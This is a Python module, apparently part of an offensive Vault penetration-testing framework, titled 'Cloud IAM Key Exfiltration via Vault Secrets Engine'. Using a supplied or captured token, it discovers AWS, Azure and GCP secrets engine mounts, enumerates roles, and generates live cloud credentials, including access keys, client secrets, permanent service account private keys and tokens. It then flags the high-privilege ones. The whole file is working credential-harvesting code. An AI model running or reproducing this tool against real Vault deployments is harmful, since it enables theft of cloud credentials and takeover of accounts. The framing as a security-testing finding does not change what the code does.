from typing import Optional

import requests

from ..context import ExecutionContext
from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel


TIMEOUT = 10

# Vault mount türü → provider kısa adı
_CLOUD_MOUNT_TYPES = {"aws", "azure", "gcp"}

# ─── Yüksek yetki göstergeleri ────────────────────────────────────────────────

_AWS_HIGH_PRIV_TERMS = (
    "administratoraccess",
    "poweruseraccess",
    "iam:*",
    "ec2:*",
    ":admin",
    "admin:",
    "fullaccess",
    "root",
)

_AZURE_HIGH_PRIV_TERMS = (
    "owner",
    "contributor",
    "global administrator",
    "privileged role administrator",
    "user access administrator",
)

_GCP_HIGH_PRIV_TERMS = (
    "roles/owner",
    "roles/editor",
    "roles/iam.securityadmin",
    "roles/iam.serviceaccountadmin",
    "roles/resourcemanager.projectiamadmin",
    "roles/compute.admin",
    "roles/storage.admin",
)


class CloudKeyExfiltrationModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="cloud_key_exfiltration.iam_creds",
            title="Cloud IAM Key Exfiltration via Vault Secrets Engine",
            risk_level=RiskLevel.STATE_CHANGING,
            description=(
                "Discovers active AWS, Azure, and GCP secrets engine mounts, lists "
                "roles/rolesets, and generates or retrieves temporary or permanent "
                "cloud IAM credentials (Access Key, Client Secret, Service Account Key). "
                "High-privilege roles (Admin, Owner, PowerUser) are flagged automatically."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(
            getattr(context, "vault_addr", None)
            and _active_token(context)
        )

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        if not self.can_run(context):
            return ExecutionResult(
                status="skipped",
                message="Cloud key exfiltration requires vault_addr and a valid token.",
                evidence={"missing": _missing_fields(context)},
            )

        params = params or {}
        token = _active_token(context, params)
        base_url = context.vault_addr.rstrip("/")
        timeout = params.get("timeout", TIMEOUT)
        verify_tls = params.get("verify_tls", getattr(context, "verify_tls", True))
        namespace = params.get("namespace", getattr(context, "namespace", None))
        provider_filter: Optional[str] = (params.get("provider") or "").lower() or None
        mount_filter: Optional[str] = params.get("mount_path")

        headers = {"X-Vault-Token": token, "Content-Type": "application/json"}
        if namespace:
            headers["X-Vault-Namespace"] = namespace

        try:
            cloud_mounts = _discover_cloud_mounts(base_url, headers, timeout, verify_tls)

            if provider_filter:
                cloud_mounts = {
                    path: info for path, info in cloud_mounts.items()
                    if info.get("type") == provider_filter
                }
            if mount_filter:
                normalized = mount_filter.strip("/") + "/"
                cloud_mounts = {k: v for k, v in cloud_mounts.items() if k == normalized}

            if not cloud_mounts:
                return ExecutionResult(
                    status="failed",
                    message=(
                        "No cloud secrets engine mounts found or accessible "
                        "with the provided token."
                    ),
                    evidence={
                        "cloud_mounts": [],
                        "provider_filter": provider_filter,
                        "mount_filter": mount_filter,
                    },
                )

            harvested: list[dict] = []
            errors: list[dict] = []

            for mount_path, mount_info in cloud_mounts.items():
                provider = mount_info.get("type", "unknown")
                mount = mount_path.strip("/")
                if provider == "aws":
                    _harvest_aws(base_url, headers, timeout, verify_tls, mount, harvested, errors)
                elif provider == "azure":
                    _harvest_azure(base_url, headers, timeout, verify_tls, mount, harvested, errors)
                elif provider == "gcp":
                    _harvest_gcp(base_url, headers, timeout, verify_tls, mount, harvested, errors)

            if not harvested:
                return ExecutionResult(
                    status="failed",
                    message=(
                        "Cloud secrets engine mounts found but no credentials "
                        "could be generated or retrieved."
                    ),
                    evidence={
                        "cloud_mounts": list(cloud_mounts),
                        "errors": errors[:20],
                    },
                )

            high_priv = [c for c in harvested if c.get("high_privilege")]
            severity = "CRITICAL" if high_priv else "HIGH"

            evidence = {
                "cloud_mounts": list(cloud_mounts),
                "total_harvested": len(harvested),
                "high_privilege_count": len(high_priv),
                "credentials": harvested,
                "errors": errors[:20],
            }

            context.add_finding(
                title=f"{severity}: Cloud IAM Credentials Harvested via Vault Secrets Engine",
                description=(
                    f"Generated or retrieved {len(harvested)} cloud IAM credential set(s) "
                    f"across {len(cloud_mounts)} mount(s) "
                    f"({_provider_summary(cloud_mounts)}). "
                    + (
                        f"{len(high_priv)} credential set(s) grant high-privilege cloud access "
                        "(Administrator/Owner/PowerUser level)."
                        if high_priv
                        else "No high-privilege indicators detected in role definitions."
                    )
                ),
                severity=severity,
                evidence=evidence,
            )

            return ExecutionResult(
                status="success",
                message=(
                    f"Harvested {len(harvested)} cloud IAM credential set(s); "
                    f"{len(high_priv)} flagged as high-privilege."
                ),
                evidence=evidence,
            )

        except requests.RequestException as exc:
            return ExecutionResult(
                status="error",
                message=f"Network error during cloud key exfiltration: {exc}",
                evidence={"error": str(exc)},
            )
        except ValueError as exc:
            return ExecutionResult(
                status="error",
                message=f"Invalid Vault response during cloud key exfiltration: {exc}",
                evidence={"error": str(exc)},
            )


# ─── Mount discovery ──────────────────────────────────────────────────────────

def _discover_cloud_mounts(base_url, headers, timeout, verify_tls):
    response = requests.get(
        f"{base_url}/v1/sys/mounts",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        return {}
    data = _safe_json(response).get("data", {})
    return {
        path: info
        for path, info in data.items()
        if isinstance(info, dict) and info.get("type") in _CLOUD_MOUNT_TYPES
    }


# ─── AWS ──────────────────────────────────────────────────────────────────────

def _harvest_aws(base_url, headers, timeout, verify_tls, mount, harvested, errors):
    roles = _list_path(base_url, headers, timeout, verify_tls, f"/v1/{mount}/roles")
    for role in roles:
        _generate_aws_creds(base_url, headers, timeout, verify_tls, mount, role, harvested, errors)


def _generate_aws_creds(base_url, headers, timeout, verify_tls, mount, role, harvested, errors):
    role_meta = _get_json(base_url, headers, timeout, verify_tls, f"/v1/{mount}/roles/{role}")
    role_policy = ""
    credential_type = ""
    if role_meta:
        data = role_meta.get("data", {})
        credential_type = data.get("credential_type", "")
        policy_arns = data.get("policy_arns") or []
        inline_policies = data.get("policy_document") or data.get("inline_policies") or []
        role_arns = data.get("role_arns") or []
        role_policy = " ".join([
            *([p if isinstance(p, str) else p.get("policy", "") for p in (policy_arns if isinstance(policy_arns, list) else [policy_arns])]),
            *(inline_policies if isinstance(inline_policies, list) else [str(inline_policies)]),
            *([r if isinstance(r, str) else "" for r in (role_arns if isinstance(role_arns, list) else [role_arns])]),
        ])

    response = requests.get(
        f"{base_url}/v1/{mount}/creds/{role}",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        errors.append({
            "provider": "aws", "mount": mount, "role": role,
            "status_code": response.status_code,
        })
        return

    body = _safe_json(response)
    cred_data = body.get("data", {})
    access_key = cred_data.get("access_key")
    secret_key = cred_data.get("secret_key")
    security_token = cred_data.get("security_token")

    if not access_key:
        errors.append({
            "provider": "aws", "mount": mount, "role": role,
            "error": "no access_key in response",
        })
        return

    print(f"[*] [ACTIVE] AWS credential generated: mount={mount} role={role} key={access_key[:8]}...")
    harvested.append({
        "provider": "aws",
        "mount": mount,
        "role": role,
        "credential_type": credential_type,
        "access_key": access_key,
        "secret_key": secret_key,
        "security_token": security_token,
        "lease_id": body.get("lease_id", ""),
        "lease_duration_seconds": body.get("lease_duration", 0),
        "high_privilege": _aws_is_high_priv(role_policy, role),
        "role_policy_preview": role_policy[:300] if role_policy else None,
    })


# ─── Azure ────────────────────────────────────────────────────────────────────

def _harvest_azure(base_url, headers, timeout, verify_tls, mount, harvested, errors):
    roles = _list_path(base_url, headers, timeout, verify_tls, f"/v1/{mount}/roles")
    for role in roles:
        _generate_azure_creds(base_url, headers, timeout, verify_tls, mount, role, harvested, errors)


def _generate_azure_creds(base_url, headers, timeout, verify_tls, mount, role, harvested, errors):
    role_meta = _get_json(base_url, headers, timeout, verify_tls, f"/v1/{mount}/roles/{role}")
    azure_roles = []
    azure_groups = []
    if role_meta:
        data = role_meta.get("data", {})
        azure_roles = data.get("azure_roles") or []
        azure_groups = data.get("azure_groups") or []

    response = requests.get(
        f"{base_url}/v1/{mount}/creds/{role}",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        errors.append({
            "provider": "azure", "mount": mount, "role": role,
            "status_code": response.status_code,
        })
        return

    body = _safe_json(response)
    cred_data = body.get("data", {})
    client_id = cred_data.get("client_id")
    client_secret = cred_data.get("client_secret")

    if not client_id:
        errors.append({
            "provider": "azure", "mount": mount, "role": role,
            "error": "no client_id in response",
        })
        return

    print(f"[*] [ACTIVE] Azure credential generated: mount={mount} role={role} client_id={client_id[:8]}...")
    harvested.append({
        "provider": "azure",
        "mount": mount,
        "role": role,
        "client_id": client_id,
        "client_secret": client_secret,
        "lease_id": body.get("lease_id", ""),
        "lease_duration_seconds": body.get("lease_duration", 0),
        "azure_roles": azure_roles,
        "azure_groups": azure_groups,
        "high_privilege": _azure_is_high_priv(azure_roles, azure_groups, role),
    })


# ─── GCP ──────────────────────────────────────────────────────────────────────

def _harvest_gcp(base_url, headers, timeout, verify_tls, mount, harvested, errors):
    # Hem roleset'leri hem static account'ları dene
    rolesets = _list_path(base_url, headers, timeout, verify_tls, f"/v1/{mount}/rolesets")
    static_accounts = _list_path(base_url, headers, timeout, verify_tls, f"/v1/{mount}/static-accounts")

    for roleset in rolesets:
        _generate_gcp_key(base_url, headers, timeout, verify_tls, mount, roleset, "roleset", harvested, errors)

    for account in static_accounts:
        _generate_gcp_key(base_url, headers, timeout, verify_tls, mount, account, "static_account", harvested, errors)


def _generate_gcp_key(
    base_url, headers, timeout, verify_tls, mount, name, source_type, harvested, errors
):
    # Önce servis hesabı anahtarı dene (/key/), sonra token (/token/)
    if source_type == "roleset":
        meta_path = f"/v1/{mount}/roleset/{name}"
        key_path = f"/v1/{mount}/key/{name}"
        token_path = f"/v1/{mount}/token/{name}"
    else:  # static_account
        meta_path = f"/v1/{mount}/static-account/{name}"
        key_path = f"/v1/{mount}/static-account/{name}/key"
        token_path = f"/v1/{mount}/static-account/{name}/token"

    meta = _get_json(base_url, headers, timeout, verify_tls, meta_path)
    bindings = []
    if meta:
        data = meta.get("data", {})
        bindings = data.get("bindings") or []

    # Önce kalıcı servis hesabı anahtarı üret
    key_response = requests.post(
        f"{base_url}{key_path}",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if key_response.status_code == 200:
        body = _safe_json(key_response)
        cred_data = body.get("data", {})
        private_key_data = cred_data.get("private_key_data")
        service_account_email = cred_data.get("service_account_email")
        print(f"[*] [ACTIVE] GCP service account key generated: mount={mount} {source_type}={name}")
        harvested.append({
            "provider": "gcp",
            "mount": mount,
            "role": name,
            "source_type": source_type,
            "credential_type": "service_account_key",
            "private_key_data": private_key_data,
            "service_account_email": service_account_email,
            "key_algorithm": cred_data.get("key_algorithm"),
            "lease_id": body.get("lease_id", ""),
            "lease_duration_seconds": body.get("lease_duration", 0),
            "high_privilege": _gcp_is_high_priv(bindings, name),
            "bindings_preview": str(bindings)[:200] if bindings else None,
        })
        return

    # Servis anahtarı başarısız olduysa kısa süreli erişim token'ı dene
    token_response = requests.post(
        f"{base_url}{token_path}",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if token_response.status_code == 200:
        body = _safe_json(token_response)
        cred_data = body.get("data", {})
        access_token = cred_data.get("token")
        if not access_token:
            errors.append({
                "provider": "gcp", "mount": mount, "role": name,
                "source_type": source_type, "error": "no token in response",
            })
            return
        print(f"[*] [ACTIVE] GCP access token generated: mount={mount} {source_type}={name}")
        harvested.append({
            "provider": "gcp",
            "mount": mount,
            "role": name,
            "source_type": source_type,
            "credential_type": "access_token",
            "access_token": access_token,
            "expires_at_seconds": cred_data.get("expires_at_seconds"),
            "service_account_email": cred_data.get("service_account_email"),
            "lease_id": body.get("lease_id", ""),
            "lease_duration_seconds": body.get("lease_duration", 0),
            "high_privilege": _gcp_is_high_priv(bindings, name),
            "bindings_preview": str(bindings)[:200] if bindings else None,
        })
        return

    errors.append({
        "provider": "gcp", "mount": mount, "role": name, "source_type": source_type,
        "key_status_code": key_response.status_code,
        "token_status_code": token_response.status_code,
    })


# ─── Yüksek yetki tespiti ─────────────────────────────────────────────────────

def _aws_is_high_priv(policy_text: str, role_name: str) -> bool:
    combined = (policy_text + " " + role_name).lower()
    return any(term in combined for term in _AWS_HIGH_PRIV_TERMS)


def _azure_is_high_priv(azure_roles: list, azure_groups: list, role_name: str) -> bool:
    all_text = (
        " ".join(
            r.get("role_name", "") if isinstance(r, dict) else str(r)
            for r in azure_roles
        )
        + " ".join(
            g.get("group_name", "") + " " + g.get("object_id", "")
            if isinstance(g, dict) else str(g)
            for g in azure_groups
        )
        + " " + role_name
    ).lower()
    return any(term in all_text for term in _AZURE_HIGH_PRIV_TERMS)


def _gcp_is_high_priv(bindings: list, role_name: str) -> bool:
    bindings_text = str(bindings).lower() if bindings else ""
    return any(
        term in bindings_text or term in role_name.lower()
        for term in _GCP_HIGH_PRIV_TERMS
    )


# ─── Yardımcılar ──────────────────────────────────────────────────────────────

def _list_path(base_url, headers, timeout, verify_tls, path):
    response = requests.request(
        "LIST",
        f"{base_url}{path}",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code == 405:
        response = requests.get(
            f"{base_url}{path}?list=true",
            headers=headers,
            timeout=timeout,
            verify=verify_tls,
        )
    if response.status_code != 200:
        return []
    return [str(k) for k in (_safe_json(response).get("data", {}).get("keys") or [])]


def _get_json(base_url, headers, timeout, verify_tls, path):
    response = requests.get(
        f"{base_url}{path}",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        return None
    return _safe_json(response)


def _safe_json(response):
    try:
        data = response.json()
    except ValueError as exc:
        raise ValueError(f"invalid json response: {response.text[:200]}") from exc
    return data if isinstance(data, dict) else {}


def _provider_summary(cloud_mounts: dict) -> str:
    counts: dict[str, int] = {}
    for info in cloud_mounts.values():
        ptype = info.get("type", "unknown")
        counts[ptype] = counts.get(ptype, 0) + 1
    return ", ".join(f"{v}x{k.upper()}" for k, v in sorted(counts.items()))


def _active_token(context, params: Optional[dict] = None):
    if params:
        explicit = params.get("token")
        if explicit:
            return explicit
    return (
        getattr(context, "captured_token", None)
        or getattr(context, "escalated_token", None)
        or getattr(context, "token", None)
    )


def _missing_fields(context):
    missing = []
    if not getattr(context, "vault_addr", None):
        missing.append("vault_addr")
    if not _active_token(context):
        missing.append("token or captured_token")
    return missing
